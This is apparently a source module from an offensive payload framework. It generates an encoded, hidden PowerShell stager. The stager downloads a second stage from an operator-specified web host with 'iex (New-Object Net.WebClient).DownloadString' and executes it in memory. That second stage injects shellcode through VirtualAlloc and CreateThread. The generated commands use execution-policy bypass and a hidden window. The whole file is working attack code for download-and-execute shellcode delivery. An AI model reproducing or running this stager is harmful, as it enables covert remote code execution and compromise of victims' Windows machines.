"""

Powershell method that builds a simple stager that downloads a secondary
encrypted powershell command from a web host and executes that in memory.

The secondary command is a powershell encrypted inline shellcode injector. 

Original concept from  http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html


Module built by @the_grayhound

"""

import base64

from modules.common import shellcode
from modules.common import helpers
from modules.common import randomizer

import settings

class Stager:
	
	def __init__(self):
		self.shortname = "DownloadVirtualAlloc"
		self.description = "Powershell method that downloads a secondary powershell command from a webserver"
		self.rating = "Excellent"
		self.language = "powershell"
		self.extension = "txt"
		
		self.shellcode = shellcode.Shellcode()
		# format is {Option : [Value, Description]]}
		self.required_options = {"DownloadHost" : ["", "The host to download the secondary stage from"],
						"DownloadPort" : ["80", "The port on the host to download from"]}
		self.notes = ""
		
	def generate(self):

		Shellcode = self.shellcode.generate()
		Shellcode = ",0".join(Shellcode.split("\\"))[1:]
		
		baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@
$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

		powershell_command  = unicode(baseString)
		blank_command = ""
		for char in powershell_command:
			blank_command += char + "\x00"
		powershell_command = blank_command
		powershell_command = base64.b64encode(powershell_command)

		payloadName = randomizer.randomString()
		
		# write base64 payload out to disk
		veil.PAYLOAD_SOURCE_PATH
		secondStageName = veil.PAYLOAD_SOURCE_PATH + payloadName
		f = open( secondStageName , 'w')
		f.write("powershell -Enc %s\n" %(powershell_command))
		f.close()
		
		
		# give notes to the user
		self.notes = "\n\tsecondary payload written to " + secondStageName + " ,"
		self.notes += " serve this on http://%s:%s\n" %(self.required_options["DownloadHost"][0], self.required_options["DownloadPort"][0],)
		
		
		# build our downloader shell
		downloaderCommand = "iex (New-Object Net.WebClient).DownloadString(\"http://%s:%s/%s\")\n" %(self.required_options["DownloadHost"][0], self.required_options["DownloadPort"][0], payloadName)
		powershell_command = unicode(downloaderCommand)
		blank_command = ""
		for char in powershell_command:
			blank_command += char + "\x00"
		powershell_command = blank_command
		powershell_command = base64.b64encode(powershell_command)
		
		downloaderCode = "x86 powershell command:\n"
		downloaderCode += "\tpowershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + powershell_command
		downloaderCode += "\n\nx64 powershell command:\n"
		downloaderCode += "\t%WinDir%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " + powershell_command + "\n"

		return downloaderCode
